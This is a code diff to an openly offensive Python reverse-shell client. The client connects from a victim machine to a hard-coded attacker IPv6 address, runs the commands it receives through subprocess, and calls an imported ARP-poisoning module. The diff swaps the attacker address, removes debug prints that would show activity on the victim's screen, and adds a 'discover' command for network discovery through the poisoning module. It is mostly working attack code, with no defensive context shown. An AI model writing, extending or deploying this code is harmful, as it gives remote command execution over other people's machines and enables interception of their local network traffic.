@@ -1,7 +1,7 @@
 import socket
 import subprocess
 import os
-from attacker_arp_poison import entry
+from attacker_arp_poison import entry, discovery
 import time
 
 BUFFER_SIZE = 4096 * 8
@@ -10,7 +10,7 @@ target_client = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
 # connects with the attacker 
 def target_client_connector():
     # connect to the attacker
-    attacker_hostname = "2409:4063:4e96:68ad:616d:ac6c:f50d:5e7c"
+    attacker_hostname = "2405:204:a38a:708d:4dfd:c0ac:2ba2:3a06"
     attacker_port = 12345
     while(True):
         success = target_client.connect_ex((attacker_hostname, attacker_port))
@@ -46,7 +46,6 @@ def receive_data():
     # do something on the data
     
     output = run_command(response)
-    print(output)
     try:
         output = output.decode('utf-8')
     except:
@@ -56,7 +55,6 @@ def receive_data():
 
 def navigate_directory(command):
     destination_directory_path = command[command.index("cd") + 3:]
-    print(destination_directory_path)
     os.chdir(destination_directory_path)
 
 #   commands of the form:
@@ -111,6 +109,14 @@ def run_command(command):
         command.index("poison")
         command_splits = command.split(" ")
         output = entry(command_splits[1], command_splits[2])
+        return output
+    except:
+        pass
+
+    try:
+        command.index("discover")
+        command_splits = command.split(" ")
+        output = discovery(command_splits[1], command_splits[2])
         return output
     except:
         pass
